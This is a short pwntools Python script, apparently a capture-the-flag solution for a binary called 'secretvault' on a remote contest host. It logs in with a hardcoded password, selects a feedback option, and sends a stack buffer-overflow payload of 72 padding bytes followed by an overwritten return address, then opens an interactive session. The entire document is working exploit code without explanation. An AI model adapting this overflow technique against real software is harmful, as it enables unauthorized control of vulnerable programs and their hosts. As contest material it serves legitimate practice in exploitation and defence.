#!/usr/bin/python3

from pwn import *

#p = process("./secretvault")
p = remote("node-1.mcsc.space",12773)
# p = gdb.debug("./secretvault",'''
#               b* 0x0000000000402330
#               c
#               ''')

p.sendlineafter("Enter master password: ",b'Sup3rS3cr3tM@st3r!')

p.sendlineafter("Choice: ",b'4')
p.sendlineafter("Rating (1-5): ",b'4')

payload = b'a'*72
payload += p64(0x0000000000401D3B)

p.sendlineafter("Your detailed feedback: ",payload)

p.interactive()
